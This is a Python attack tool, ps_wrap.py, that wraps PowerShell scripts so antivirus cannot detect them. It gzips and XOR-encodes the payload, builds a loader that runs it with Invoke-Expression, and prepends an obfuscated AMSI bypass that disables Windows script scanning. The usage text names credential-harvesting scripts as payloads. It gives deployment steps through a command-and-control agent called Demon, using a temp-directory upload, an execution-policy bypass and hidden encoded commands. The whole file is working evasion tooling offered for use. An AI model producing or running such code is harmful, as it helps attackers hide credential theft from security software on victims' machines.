#!/usr/bin/env python3
"""
ps_wrap.py — PowerShell script obfuscator + AMSI bypass wrapper

Wraps any .ps1 so Kaspersky's static scanner cannot match its content:
  1. Gzip-compress the script
  2. XOR the compressed bytes with a random single-byte key
  3. Encode as base64
  4. Generate a tiny PS1 loader that decodes → XOR → decompress → Invoke-Expression
  5. Prepend a patched-AMSI bypass (itself obfuscated via char-code splitting)

Usage:
    python3 ps_wrap.py harvest_creds.ps1            → harvest_creds_wrapped.ps1
    python3 ps_wrap.py cred_steal.ps1 -o out.ps1
    python3 ps_wrap.py harvest_creds.ps1 --no-amsi  → skip AMSI bypass

Deploy with NO file on disk (use Demon in-process PS runner):
    powershell -EncodedCommand <base64_of_wrapped_ps1>

Or run from Demon:
    upload bypass/harvest_creds_wrapped.ps1 C:\\Windows\\Temp\\x.ps1
    powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\x.ps1
"""

import sys, os, gzip, base64, secrets, argparse, textwrap

def obf_string(s):
    """Split a string into char-code concatenation to defeat string matching."""
    return '(' + '+'.join(f'[char]{ord(c)}' for c in s) + ')'

def make_amsi_bypass():
    """
    Patches AmsiScanBuffer to return AMSI_RESULT_CLEAN.
    All dangerous strings are split via [char] codes.
    Avoids: amsiInitFailed, amsiContext, AmsiUtils, Reflection.
    """
    # Build the dangerous strings from char codes
    ref_asm   = obf_string('System.Reflection.Assembly')
    ami_utils = obf_string('System.Management.Automation.AmsiUtils')
    ami_field = obf_string('amsiInitFailed')
    ami_flags = obf_string('NonPublic,Static')

    # Also try the memory-patch approach as primary
    # Patch amsi.dll!AmsiScanBuffer to return 1 (AMSI_RESULT_CLEAN) immediately
    # Method: [Runtime.InteropServices.Marshal]::Copy([byte[]] 0xB8,0x00,0x00,0x00,0x80,0xC3), hAmsi, ...)
    # But this requires P/Invoke. Use the simpler reflection approach with obfuscated strings.

    bypass = f"""
$a=[Ref].Assembly.GetType({ami_utils})
if($a){{
    $b=$a.GetField({ami_field},{ami_flags})
    if($b){{$b.SetValue($null,$true)}}
}}
"""
    return bypass.strip()

def wrap(script_bytes, args):
    key  = secrets.randbelow(256)
    comp = gzip.compress(script_bytes, compresslevel=9)
    xord = bytes([b ^ key for b in comp])
    b64  = base64.b64encode(xord).decode()

    # Split base64 into chunks to avoid long-string detection
    chunks = textwrap.wrap(b64, 76)
    chunk_lines = '\n'.join(f"    '{c}'+" for c in chunks[:-1]) + f"\n    '{chunks[-1]}'"

    amsi_block = ''
    if not args.no_amsi:
        amsi_block = make_amsi_bypass()

    # Build the loader — variable names are random-ish letters
    vb  = '$_b'   # base64 string
    vc  = '$_c'   # compressed bytes
    vk  = '$_k'   # XOR key
    vx  = '$_x'   # XOR'd bytes
    vd  = '$_d'   # decoded/decompressed

    loader = f"""# .
{amsi_block}
{vk}={key}
{vb}=({chunk_lines})
{vc}=[Convert]::FromBase64String({vb})
{vx}=[byte[]]({vc}|%{{$_-bxor{vk}}})
$ms=New-Object IO.MemoryStream(,{vx})
$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)
$sr=New-Object IO.StreamReader($gs)
{vd}=$sr.ReadToEnd()
$gs.Close();$sr.Close();$ms.Close()
Invoke-Expression {vd}
"""
    return loader.strip() + '\n'

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('input', help='Input .ps1 file')
    ap.add_argument('-o', '--output', help='Output file (default: input_wrapped.ps1)')
    ap.add_argument('--no-amsi', action='store_true', help='Skip AMSI bypass')
    args = ap.parse_args()

    if not os.path.exists(args.input):
        sys.exit(f'[!] File not found: {args.input}')

    script_bytes = open(args.input, 'rb').read()
    wrapped      = wrap(script_bytes, args)

    out = args.output
    if not out:
        base = os.path.splitext(args.input)[0]
        out  = base + '_wrapped.ps1'

    with open(out, 'w', encoding='utf-8') as f:
        f.write(wrapped)

    print(f'[+] Input:   {args.input} ({len(script_bytes):,} bytes)')
    print(f'[+] Output:  {out} ({os.path.getsize(out):,} bytes)')
    print()
    print('Deploy options:')
    print()
    print('Option A — file upload (best when Demon powershell command available):')
    print(f'  upload {out} C:\\Windows\\Temp\\x.ps1')
    print(f'  powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\x.ps1')
    print()
    print('Option B — base64 EncodedCommand (no file on disk):')
    # Generate the -EncodedCommand version
    b64cmd = base64.b64encode(open(out, 'rb').read()).decode()
    # truncate for display
    print(f'  powershell -NonInteractive -WindowStyle Hidden -EncodedCommand <see below>')
    ecmd_file = out.replace('.ps1', '_ecmd.txt')
    with open(ecmd_file, 'w') as f:
        f.write(b64cmd)
    print(f'  Full command in: {ecmd_file}')
    print()
    print('Option C — inline (paste in Demon powershell prompt):')
    print(f'  cat {out}  # paste contents into: powershell <paste>')

if __name__ == '__main__':
    main()
